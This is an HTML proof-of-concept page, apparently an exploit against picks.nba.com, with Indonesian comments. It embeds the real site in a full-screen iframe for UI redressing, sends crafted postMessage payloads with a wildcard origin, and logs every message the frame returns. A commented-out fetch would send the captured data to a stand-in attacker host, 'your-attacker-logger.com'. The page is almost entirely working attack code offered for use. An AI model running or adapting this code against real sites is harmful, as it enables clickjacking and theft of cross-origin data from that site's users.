<!DOCTYPE html>
<html>
<head>
  <title>NBA Picks Exploit</title>
  <style>
    html, body, iframe {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      border: none;
      z-index: 10;
    }
  </style>
</head>
<body>
  <iframe id="target" src="https://picks.nba.com" sandbox="allow-scripts allow-same-origin allow-forms" allow="clipboard-read; clipboard-write"></iframe>

  <script>
    const targetFrame = document.getElementById("target");

    // Fungsi kirim resize (UI redress) agar iframe menutupi seluruh layar
    function sendResize() {
      const resizePayload = {
        event: "resize",
        height: 2000 // bisa dibuat lebih besar
      };
      targetFrame.contentWindow.postMessage(resizePayload, "*");
      console.log("[+] Resize payload dikirim");
    }

    // Fungsi kirim payload Adobe Launch atau data lainnya
    function sendAdobePayload() {
      const payload = {
        payload: {
          instance: {
            sourceConfiguration: {
              options: {
                consentData: {},
                abTesting: {},
                diagnostics: {},
                multiplexing: {}
              }
            },
            fetchIdData: {
              refererInfo: {
                stack: [null]
              },
              abTesting: {},
              uaHints: {
                brands: [{}],
                fullVersionList: []
              },
              trueLink: {}
            }
          },
          instanceState: {
            knownInstances: [],
            multiplexing: {}
          }
        }
      };
      targetFrame.contentWindow.postMessage(payload, "*");
      console.log("[+] Adobe Launch payload dikirim");
    }

    // Logger semua message yang keluar dari iframe
    window.addEventListener("message", function(event) {
      console.log(`[ðŸ””] Message from iframe`);
      console.log("Origin:", event.origin);
      console.log("Data:", event.data);

      // Optional: log ke server attacker kamu
      /*
      fetch("https://your-attacker-logger.com/log", {
        method: "POST",
        body: JSON.stringify({
          origin: event.origin,
          data: event.data
        }),
        headers: {
          "Content-Type": "application/json"
        }
      });
      */
    });

    // Mulai chaining payload
    setTimeout(() => {
      sendResize();          // UI redress dulu
      setTimeout(() => {
        sendAdobePayload();  // Adobe Launch payload setelahnya
      }, 2000);
    }, 2000);
  </script>
</body>
</html>
